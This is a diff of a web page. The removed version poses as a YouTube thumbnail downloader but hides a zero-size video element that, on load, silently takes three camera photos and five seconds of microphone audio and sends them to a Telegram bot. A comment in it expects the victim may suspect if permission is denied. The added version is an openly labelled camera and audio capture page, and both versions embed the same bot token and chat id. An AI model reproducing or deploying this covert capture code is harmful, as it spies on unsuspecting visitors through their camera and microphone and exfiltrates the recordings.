@@ -2,226 +2,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-  <title>YouTube Thumbnail Downloader</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
-  <style>
-    body {
-      font-family: 'Montserrat', sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: #f5f5f5;
-    }
-    .navbar {
-      background-color: #ff0000;
-      color: white;
-      text-align: center;
-      padding: 15px 0;
-    }
-    #header {
-      margin: 0;
-      font-size: 28px;
-      font-weight: bold;
-    }
-    .container {
-      max-width: 600px;
-      margin: 20px auto;
-      padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    .form-control {
-      width: calc(100% - 22px);
-      margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      box-sizing: border-box;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
-      color: white;
-      font-size: 16px;
-      cursor: pointer;
-      font-family: 'Montserrat', sans-serif;
-    }
-    #thumbdloadbtn:hover {
-      background-color: #cc0000;
-    }
-    footer {
-      text-align: center;
-      margin-top: 40px;
-      color: #666;
-    }
-    .youtube-logo {
-      display: block;
-      margin: 20px auto;
-      width: 100px; /* Adjust size as needed */
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Media Capture to Telegram</title>
 </head>
 <body>
-  <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
-  </nav>
+  <h2>Capture Media and Send to Telegram</h2>
+  
+  <video id="video" autoplay playsinline style="width: 300px;"></video>
+  <button id="captureBtn">Capture Photo</button>
+  <button id="recordAudioBtn">Record Audio</button>
+  <button id="redirectBtn">Open URL in Google Chrome</button> <!-- New redirect button -->
 
-  <div class="container">
-    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
-    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+  <script>
+    const video = document.getElementById('video');
+    const captureBtn = document.getElementById('captureBtn');
+    const recordAudioBtn = document.getElementById('recordAudioBtn');
+    const redirectBtn = document.getElementById('redirectBtn'); // New reference for the redirect button
 
-    <h2>How to Download HD YouTube Thumbnail</h2>
-    <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
-    </ol>
-  </div>
-
-  <center>
-    <button id="toggle-video" style="display:none;">Toggle Video</button>
-    <div id="message-container"></div>
-    <video id="video" width="0" height="0" autoplay></video>
-  </center>
-
-  <script type="text/javascript">
-  function downloadThumbnail() {
-        // Change button text to indicate fetching
-        var btn = document.getElementById('thumbdloadbtn');
-        btn.textContent = 'Fetching from server... Wait';
-
-        // Add your logic to fetch the thumbnail here
-        // ...
+    // 1. Start the camera video stream
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error('Error accessing camera: ', err);
+      }
     }
-    function la(src) {
-      window.location = src;
-    }
-    
-         function GetURLParameter(sParam) {
-           var sPageURL = window.location.search.substring(1);
-           var sURLVariables = sPageURL.split('&');
-           for (var i = 0; i < sURLVariables.length; i++) {
-             var sParameterName = sURLVariables[i].split('=');
-             if (sParameterName[0] == sParam) {
-               return sParameterName[1];
-             }
-           }
-         }
-    
-         var chatid = GetURLParameter('id');
-         
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-      .then((stream) => {
-        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
-        const audioRecorder = new MediaRecorder(stream);
 
-        function capturePhoto(index) {
-          setTimeout(() => {
-            imageCapture.takePhoto()
-              .then((blob) => {
-                sendToTelegram(blob, 'photo');
-              })
-              .catch((error) => {
-                console.error('Error capturing photo:', error);
-              });
-          }, index * 2000);
-        }
+    // 2. Capture photo from video stream
+    captureBtn.addEventListener('click', () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        function startAudioRecording() {
-          audioRecorder.start();
-          setTimeout(() => {
-            audioRecorder.stop();
-          }, 5000);
-        }
+      canvas.toBlob(async (blob) => {
+        await sendToTelegram(blob, 'photo');  // Send captured photo to Telegram
+      }, 'image/jpeg');
+    });
 
-        audioRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            sendToTelegram(event.data, 'audio');
-          }
+    // 3. Record audio using MediaRecorder
+    recordAudioBtn.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+          await sendToTelegram(audioBlob, 'audio');  // Send recorded audio to Telegram
         };
 
-        for (let i = 0; i < 3; i++) {
-          capturePhoto(i);
-        }
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 5000);  // Stop recording after 5 seconds
+      } catch (err) {
+        console.error('Error accessing microphone: ', err);
+      }
+    });
 
-        startAudioRecording();
-      })
-      .catch((error) => {
-        if (error.name === 'NotAllowedError') {
-          // Handle the case where permissions are denied
-          console.warn('Permissions denied. User may suspect.');
-        } else {
-          console.error('Permission error:', error);
-        }
-      });
+    // 4. Function to send media to Telegram
+    async function sendToTelegram(blob, type) {
+      const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U'; // Replace with your bot token
+      const chatId = '7532339931'; // Replace with the chat ID to send the media to
+      
+      const formData = new FormData();
+      formData.append(type, blob, `${type}.${type === 'photo' ? 'jpg' : 'ogg'}`);
 
-//     function sendToTelegram(data, type) {
-  
+      const endpoint = `https://api.telegram.org/bot${botToken}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
 
-//       const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
-//       const chatId = chatid;
+      formData.append('chat_id', chatId);
 
-//       const formData = new FormData();
-//       formData.append('7532339931', chatId);
-//       formData.append(type === 'photo' ? 'photo' : 'audio', data, `@hacke100_bot.${type === 'photo' ? 'jpg' : 'wav'}`);
-
-//       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
-// {
-//         method: 'POST',
-//         body: formData
-//       })
-//         .then(response => response.json())
-//         .then(data => console.log(data))
-//         .catch(error => console.error('Error sending to Telegram:', error));
-//     }
-               
-
-
-function sendToTelegram(data, type, chatId) {
-    const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U'; // Replace with your bot token
-
-    const formData = new FormData();
-    formData.append('7532339931', chatId);
-    
-    if (type === 'photo') {
-        formData.append('photo', data, 'image.jpg'); // Assuming the file is a photo
-    } else if (type === 'audio') {
-        formData.append('audio', data, 'audio.wav'); // Assuming the file is audio
-    } else {
-        console.error('Unsupported type:', type);
-        return;
+      try {
+        const response = await fetch(endpoint, {
+          method: 'POST',
+          body: formData
+        });
+        const result = await response.json();
+        console.log('Telegram response:', result);
+      } catch (err) {
+        console.error('Error sending to Telegram:', err);
+      }
     }
 
-    fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-        method: 'POST',
-        body: formData
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-    .catch(error => console.error('Error sending to Telegram:', error));
-}
+    // 5. Redirect function to open URL in Google Chrome
+    function redirectToChrome() {
+      const url = 'https://www.example.com'; // Replace with the desired URL
+      const chromeUrl = `googlechrome://${url.replace(/^https?:\/\//, '')}`;
+      
+      // Redirect to the Google Chrome URL scheme
+      window.location.href = chromeUrl;
+    }
 
+    // Event listener for the redirect button
+    redirectBtn.addEventListener('click', redirectToChrome);
 
-
-    
-    
+    // Start the camera on page load
+    startCamera();
   </script>
-
-  <footer>
-    <p>Made With ❤️ By RANA SOWDAGO </p>
-  </footer>
 </body>
 </html>
+
